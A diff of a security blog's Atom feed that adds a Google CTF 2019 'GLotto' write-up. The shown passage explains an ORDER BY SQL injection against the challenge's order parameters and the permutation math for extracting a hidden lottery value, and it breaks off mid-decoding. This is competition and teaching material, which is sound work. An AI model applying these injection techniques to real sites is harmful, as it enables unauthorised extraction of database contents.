@@ -1,5 +1,177 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>cfreal</title><link href="https://cfreal.github.io/" rel="alternate"></link><link href="https://cfreal.github.io/feeds/all.atom.xml" rel="self"></link><id>https://cfreal.github.io/</id><updated>2019-04-03T00:00:00+02:00</updated><entry><title>CARPE (DIEM): CVE-2019-0211 Apache Root Privilege Escalation</title><link href="https://cfreal.github.io/carpe-diem-cve-2019-0211-apache-local-root.html" rel="alternate"></link><published>2019-04-03T00:00:00+02:00</published><updated>2019-04-03T00:00:00+02:00</updated><author><name>Charles Fol</name></author><id>tag:cfreal.github.io,2019-04-03:/carpe-diem-cve-2019-0211-apache-local-root.html</id><summary type="html">&lt;p&gt;Since version 2.4.17 (Oct 9, 2015), up until version 2.4.38 (Apr 1, 2019), Apache HTTP suffers from a local root privilege escalation vulnerability due to an out-of-bounds array access leading to an arbitrary function call.&lt;/p&gt;</summary><content type="html">&lt;h1&gt;Introduction&lt;/h1&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>cfreal</title><link href="https://cfreal.github.io/" rel="alternate"></link><link href="https://cfreal.github.io/feeds/all.atom.xml" rel="self"></link><id>https://cfreal.github.io/</id><updated>2019-06-27T00:00:00+02:00</updated><entry><title>Google CTF Quals 2019: GLotto Writeup</title><link href="https://cfreal.github.io/google-ctf-2019-glotto-writeup.html" rel="alternate"></link><published>2019-06-27T00:00:00+02:00</published><updated>2019-06-27T00:00:00+02:00</updated><author><name>Charles Fol</name></author><id>tag:cfreal.github.io,2019-06-27:/google-ctf-2019-glotto-writeup.html</id><summary type="html">&lt;p&gt;The Google CTF 2019 Quals happened this week-end and a friend told me about the GLotto web challenge, which seemed really fun. I had a go at it and here's my writeup.&lt;/p&gt;</summary><content type="html">&lt;h1&gt;Introduction&lt;/h1&gt;
+&lt;p&gt;The Google CTF 2019 Quals happened this week-end and a friend told me about the GLotto web challenge, which seemed really fun. Can you imagine this ? A &lt;em&gt;fun&lt;/em&gt; web challenge ! 
+I had a go at it and here's my writeup. The idea is to push an ORDER BY SQL injection to the limit, in order to get as much information as possible. This involves a little bit of math,
+and a little bit of SQL dance.&lt;/p&gt;
+&lt;h1&gt;Challenge&lt;/h1&gt;
+&lt;h2&gt;Web page&lt;/h2&gt;
+&lt;p&gt;Upon browsing to &lt;a href="https://glotto.web.ctfcompetition.com/"&gt;https://glotto.web.ctfcompetition.com/&lt;/a&gt;, we're presented with a page that contains multiple winning lottery tickets for different dates. There are 4 tables, one for each of the four last months. We're allowed to sort the 4 different tables by their columns, and can submit a ticket in order to know if we won the lottery. The source code of the page is reachable &lt;a href="https://glotto.web.ctfcompetition.com/?src"&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;h2&gt;Source&lt;/h2&gt;
+&lt;p&gt;The PHP source code reveals that an SQL table is associated to each month. Four queries are ran, one for each table; in these, the &lt;code&gt;order0&lt;/code&gt; to &lt;code&gt;order3&lt;/code&gt; GET parameters are used in an &lt;code&gt;ORDER BY&lt;/code&gt; SQL clause. They are injectable. We also learn that a lottery ticket is generated every time we visit the page. It is stored in the database as a MySQL variable, as well as in our PHP session. When we verify our ticket, the value in our PHP session is compared with the &lt;code&gt;code&lt;/code&gt; value we submitted, and the session value is deleted.&lt;/p&gt;
+&lt;h1&gt;Approaching the problem&lt;/h1&gt;
+&lt;h2&gt;Problem&lt;/h2&gt;
+&lt;p&gt;It is easy to figure out what we need to do: we need to obtain the value of the SQL variable &lt;code&gt;@lotto&lt;/code&gt; by performing an &lt;code&gt;ORDER BY&lt;/code&gt; SQL injection on the four queries that are ran. What's harder is how to solve the problem.&lt;/p&gt;
+&lt;h2&gt;Finding a strategy&lt;/h2&gt;
+&lt;p&gt;As the generated winning ticket contains 12 characters of a 36-character charset, we have a total of &lt;code&gt;36**12 = 4738381338321616896&lt;/code&gt; possible values for a ticket. It might seem like a lot, but it is &lt;strong&gt;around ~62 bits&lt;/strong&gt;. Standard &lt;code&gt;ORDER BY&lt;/code&gt; SQL injections -- in our case &lt;code&gt;IF(&amp;lt;condition&amp;gt;,date,winning)&lt;/code&gt; -- allow us to yield &lt;code&gt;n&lt;/code&gt; different outputs from one query, with &lt;code&gt;n&lt;/code&gt; being the number of columns. Since here we have 2 columns per table, we can fetch 1 bit per table, and therefore a whole 4 bits using the 4 injection points, which leaves a whole 58 bits to luck. We're a &lt;em&gt;little bit&lt;/em&gt; off.&lt;/p&gt;
+&lt;p&gt;Luckily, the standard way &lt;code&gt;ORDER BY&lt;/code&gt; injections are exploited is far from optimal. To improve our output, we can use the position of each row in each table as a way to encode information. For instance, the 8 rows of the March table, can be displayed in &lt;code&gt;8!&lt;/code&gt; different orders. The second one, which has 9 rows, can yield &lt;code&gt;9!&lt;/code&gt; outputs. The third and last would themselves produce &lt;code&gt;7!&lt;/code&gt; and &lt;code&gt;4!&lt;/code&gt; different outputs. This gives us &lt;code&gt;8!9!7!4! = 1769804660736000&lt;/code&gt; possible outputs, which is around &lt;code&gt;50&lt;/code&gt; bits. In precise terms, if we obtain information through this technique, we'll have &lt;code&gt;36**12 / (8!9!7!4!) = 2677.34&lt;/code&gt; possibilities left. This is bruteforcable.&lt;/p&gt;
+&lt;p&gt;Our game plan is therefore to obtain information by permuting the rows of the 4 tables, and leave the rest to a &lt;strong&gt;1 out of 2678 luck&lt;/strong&gt;. If this fails, we can repeat the process until we do indeed get lucky.&lt;/p&gt;
+&lt;p&gt;The next challenge is to properly encode and decode information: how do we transfer the lottery ticket, &lt;code&gt;@lotto&lt;/code&gt;, using the order of the rows of the 4 different tables ?&lt;/p&gt;
+&lt;h1&gt;Solving the math problem&lt;/h1&gt;
+&lt;h2&gt;Numbers, numbers, numbers&lt;/h2&gt;
+&lt;p&gt;As usual when solving math problems, we'd like to work with numbers. First, the lottery ticket can be though of as a number in base 36. It can be converted to base 10 using &lt;code&gt;CONV(@lotto, 36, 10)&lt;/code&gt;. Then, the &lt;code&gt;date&lt;/code&gt; column of the March table can be converted to a sequence of number between 0 and 7 using &lt;code&gt;FIND_IN_SET(MID(date, 9), '01,03,05,10,13,18,23,28,30') - 1&lt;/code&gt;. The same logic can be applied to the 3 other tables. The problem just got a little bit simpler: we want to transmit a number by encoding it through a permutation of sequencial numbers.&lt;/p&gt;
+&lt;h2&gt;Encoding, transmitting, and decoding a number&lt;/h2&gt;
+&lt;p&gt;To ease our though process, we'll know consider this subproblem: how do we encode a number in &lt;code&gt;[0, 8![&lt;/code&gt; through the permutation of 8 rows ?&lt;/p&gt;
+&lt;h3&gt;How do we get &lt;code&gt;8!&lt;/code&gt; possible permutations from &lt;code&gt;8&lt;/code&gt; rows ?&lt;/h3&gt;
+&lt;p&gt;Imagine you have 8 boxes (the positions for the columns), aligned from left to right, in which you want to put 8 different numbers, from 0 to 7 (the columns). You first focus on the first (the left-most, for instance) box. You can put in any of the 8 numbers. You pick one, put it in, and go to the next box. You can then put any of the 7 remaining numbers in. You then go to the third box, in which you can put any of the 6 remaining numbers, etc. When reaching the last box, you have only one number left, and have no choice but to put it in. This therefore gives you the following amount of choices: 8 for the first box, then 7, then 6, etc., until 1. Each of the choices you make influences the next: if you put number 1 in the first box, it cannot be put in any of the other boxes. Therefore, you get &lt;code&gt;8 * 7 * 6 * 5 * 4 * 3 * 2 * 1 = 8!&lt;/code&gt; choices.&lt;/p&gt;
+&lt;h3&gt;Encoding&lt;/h3&gt;
+&lt;p&gt;Let &lt;code&gt;N&lt;/code&gt; be the number that we wish to encode. For the first box, we have 8 choices. We can therefore split &lt;code&gt;N&lt;/code&gt; into &lt;strong&gt;8 subparts&lt;/strong&gt;, and associate a number from &lt;code&gt;0&lt;/code&gt; to &lt;code&gt;7&lt;/code&gt; to it. To do so, we can simply perform the operation: &lt;code&gt;r8 = N % 8&lt;/code&gt;. Indeed, if &lt;code&gt;r8&lt;/code&gt; is &lt;code&gt;0&lt;/code&gt;, this means that &lt;code&gt;N&lt;/code&gt; is in the first of the 8 subparts. If &lt;code&gt;r8&lt;/code&gt; is &lt;code&gt;1&lt;/code&gt;, &lt;code&gt;N&lt;/code&gt; is in the second subpart, etc. This gives us 8 different "parts", as we wanted. Since we've encoded part of our number into 8 possible values for the first box, we can jump to the next one.&lt;/p&gt;
+&lt;p&gt;By definition, &lt;code&gt;r8 = N % 8&lt;/code&gt; yields the following equation: &lt;code&gt;N = d8 * 8 + r8&lt;/code&gt;, with &lt;code&gt;d8&lt;/code&gt; an unknown integer.
+In the second box, we can only put 7 values. Therefore, we need to split the remaining unknown number, &lt;code&gt;d8&lt;/code&gt;, into 7 parts. Again, this can be done by using &lt;code&gt;r7 = d8 % 7&lt;/code&gt;. Again, this yields the equation: &lt;code&gt;d8 = d7 * 7 + r7&lt;/code&gt;. And again, we can move to the next box.&lt;/p&gt;
+&lt;p&gt;Iterating over boxes, we get the following system:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;N&lt;/span&gt;  &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;d8&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;r8&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;r8&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;span class="n"&gt;d8&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;d7&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;r7&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;r7&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;span class="n"&gt;d7&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;d6&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;r6&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;r6&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;span class="n"&gt;d6&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;d5&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;r5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;r5&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;span class="n"&gt;d5&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;d4&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;r4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;r4&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;span class="n"&gt;d4&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;d3&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;r3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;r3&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;span class="n"&gt;d3&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;d2&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;r2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;r2&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;span class="n"&gt;d2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Now, by definition, &lt;code&gt;r8&lt;/code&gt;, &lt;code&gt;r7&lt;/code&gt;, up until &lt;code&gt;r2&lt;/code&gt; are the numbers that we have put in the boxes. In other words, they are the date columns displayed on the web page, in a specific order.
+For instance, if &lt;code&gt;r8&lt;/code&gt; is 3, we'll put the third date (&lt;code&gt;2019-03-05&lt;/code&gt;) at index 8 in the SQL result. If &lt;code&gt;r7&lt;/code&gt; is 4, it means that the fourth date (&lt;code&gt;2019-03-10&lt;/code&gt;) is at index 7 in the SQL result, etc. In essence, we transmitted &lt;code&gt;r8&lt;/code&gt; to &lt;code&gt;r2&lt;/code&gt; through the injection &lt;em&gt;(we'll see later that's it's a bit tougher)&lt;/em&gt;.&lt;/p&gt;
+&lt;h3&gt;Decoding&lt;/h3&gt;
+&lt;p&gt;Now, how do we reconstruct N from our &lt;code&gt;r&lt;/code&gt;s ? This is easily done by working our way up the equation system:&lt;/p&gt;
+&lt;p&gt;Example:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+
+&lt;span class="n"&gt;N&lt;/span&gt;  &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;d8&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="mi"&gt;34843&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;4355&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;
+&lt;span class="n"&gt;d8&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;d7&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;  &lt;span class="mi"&gt;4355&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;622&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
+&lt;span class="n"&gt;d7&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;d6&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;   &lt;span class="mi"&gt;622&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;103&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;
+&lt;span class="n"&gt;d6&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;d5&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;   &lt;span class="mi"&gt;103&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;20&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;
+&lt;span class="n"&gt;d5&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;d4&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;   &lt;span class="mi"&gt;20&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
+&lt;span class="n"&gt;d4&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;d3&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;    &lt;span class="mi"&gt;5&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;
+&lt;span class="n"&gt;d3&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;d2&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;    &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
+&lt;span class="n"&gt;d2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;          &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="n"&gt;we&lt;/span&gt; &lt;span class="k"&gt;work&lt;/span&gt; &lt;span class="n"&gt;our&lt;/span&gt; &lt;span class="n"&gt;way&lt;/span&gt; &lt;span class="n"&gt;up&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;here, N is &lt;code&gt;34843&lt;/code&gt;.&lt;/p&gt;
+&lt;h3&gt;Transmitting&lt;/h3&gt;
+&lt;p&gt;Now, we'd like to think that we are almost done; nevertheless, there is a small problem that needs to be solved. In the above example, the values I want to transmit are the following:
+&lt;code&gt;3, 1, 4, 3, 0, 2, 1&lt;/code&gt;. So, in the first box, I put &lt;code&gt;3&lt;/code&gt;. In the second, I put &lt;code&gt;1&lt;/code&gt;. In the third, &lt;code&gt;4&lt;/code&gt;. And in the fourth, I put &lt;code&gt;3&lt;/code&gt; again... but I can't, because &lt;code&gt;3&lt;/code&gt; is already in the second box !&lt;/p&gt;
+&lt;p&gt;Well, that's the thing. We don't put the exact number in the box, I put &lt;code&gt;n&lt;/code&gt;th number that is left. Let's go back to our example:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;B&lt;/span&gt;  &lt;span class="n"&gt;r&lt;/span&gt;  &lt;span class="n"&gt;Numbers&lt;/span&gt; &lt;span class="k"&gt;left&lt;/span&gt;     &lt;span class="n"&gt;PUT&lt;/span&gt;
+&lt;span class="mi"&gt;0&lt;/span&gt;  &lt;span class="mi"&gt;3&lt;/span&gt;  &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt;  &lt;span class="mi"&gt;3&lt;/span&gt;
+&lt;span class="mi"&gt;1&lt;/span&gt;  &lt;span class="mi"&gt;1&lt;/span&gt;  &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;   &lt;span class="mi"&gt;4&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt;  &lt;span class="mi"&gt;1&lt;/span&gt;
+&lt;span class="mi"&gt;2&lt;/span&gt;  &lt;span class="mi"&gt;4&lt;/span&gt;  &lt;span class="mi"&gt;0&lt;/span&gt;   &lt;span class="mi"&gt;2&lt;/span&gt;   &lt;span class="mi"&gt;4&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt;  &lt;span class="mi"&gt;6&lt;/span&gt;
+&lt;span class="mi"&gt;3&lt;/span&gt;  &lt;span class="mi"&gt;3&lt;/span&gt;  &lt;span class="mi"&gt;0&lt;/span&gt;   &lt;span class="mi"&gt;2&lt;/span&gt;   &lt;span class="mi"&gt;4&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;   &lt;span class="mi"&gt;7&lt;/span&gt;  &lt;span class="mi"&gt;5&lt;/span&gt;
+&lt;span class="mi"&gt;4&lt;/span&gt;  &lt;span class="mi"&gt;0&lt;/span&gt;  &lt;span class="mi"&gt;0&lt;/span&gt;   &lt;span class="mi"&gt;2&lt;/span&gt;   &lt;span class="mi"&gt;4&lt;/span&gt;     &lt;span class="mi"&gt;7&lt;/span&gt;  &lt;span class="mi"&gt;0&lt;/span&gt;
+&lt;span class="mi"&gt;5&lt;/span&gt;  &lt;span class="mi"&gt;2&lt;/span&gt;      &lt;span class="mi"&gt;2&lt;/span&gt;   &lt;span class="mi"&gt;4&lt;/span&gt;     &lt;span class="mi"&gt;7&lt;/span&gt;  &lt;span class="mi"&gt;7&lt;/span&gt;
+&lt;span class="mi"&gt;6&lt;/span&gt;  &lt;span class="mi"&gt;1&lt;/span&gt;      &lt;span class="mi"&gt;2&lt;/span&gt;   &lt;span class="mi"&gt;4&lt;/span&gt;        &lt;span class="mi"&gt;4&lt;/span&gt;
+&lt;span class="mi"&gt;7&lt;/span&gt;  &lt;span class="mi"&gt;0&lt;/span&gt;      &lt;span class="mi"&gt;2&lt;/span&gt;            &lt;span class="mi"&gt;2&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Regarding our SQL query, this translates as: In the topmost column, we have date number &lt;code&gt;3&lt;/code&gt; (&lt;code&gt;2019-03-10&lt;/code&gt;). In the second, date number &lt;code&gt;1&lt;/code&gt; (&lt;code&gt;2019-03-03&lt;/code&gt;), etc.&lt;/p&gt;
+&lt;p&gt;Now, to convert the table we obtain after our SQLi into the real remainders &lt;code&gt;r2&lt;/code&gt; to &lt;code&gt;r8&lt;/code&gt;, we can:
+1. Read each column for the March table, and convert the dates into their associated index &lt;code&gt;D = [3, 1, 6, 5, 0, 7, 4, 2]&lt;/code&gt;.
+2. Keep a list &lt;code&gt;L&lt;/code&gt; of numbers that are left: &lt;code&gt;L = [0, 1, 2, 3, 4, 5, 6, 7]&lt;/code&gt;.
+3. For each index in &lt;code&gt;D&lt;/code&gt;, find its position in &lt;code&gt;L&lt;/code&gt;, then remove it from &lt;code&gt;L&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;This gives us:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;B&lt;/span&gt;  &lt;span class="n"&gt;D&lt;/span&gt;  &lt;span class="n"&gt;L&lt;/span&gt;                &lt;span class="n"&gt;r&lt;/span&gt;
+&lt;span class="mi"&gt;0&lt;/span&gt;  &lt;span class="mi"&gt;3&lt;/span&gt;  &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt;  &lt;span class="mi"&gt;3&lt;/span&gt;
+&lt;span class="mi"&gt;1&lt;/span&gt;  &lt;span class="mi"&gt;1&lt;/span&gt;  &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;   &lt;span class="mi"&gt;4&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt;  &lt;span class="mi"&gt;1&lt;/span&gt;
+&lt;span class="mi"&gt;2&lt;/span&gt;  &lt;span class="mi"&gt;6&lt;/span&gt;  &lt;span class="mi"&gt;0&lt;/span&gt;   &lt;span class="mi"&gt;2&lt;/span&gt;   &lt;span class="mi"&gt;4&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt;  &lt;span class="mi"&gt;4&lt;/span&gt;
+&lt;span class="mi"&gt;3&lt;/span&gt;  &lt;span class="mi"&gt;5&lt;/span&gt;  &lt;span class="mi"&gt;0&lt;/span&gt;   &lt;span class="mi"&gt;2&lt;/span&gt;   &lt;span class="mi"&gt;4&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;   &lt;span class="mi"&gt;7&lt;/span&gt;  &lt;span class="mi"&gt;3&lt;/span&gt;
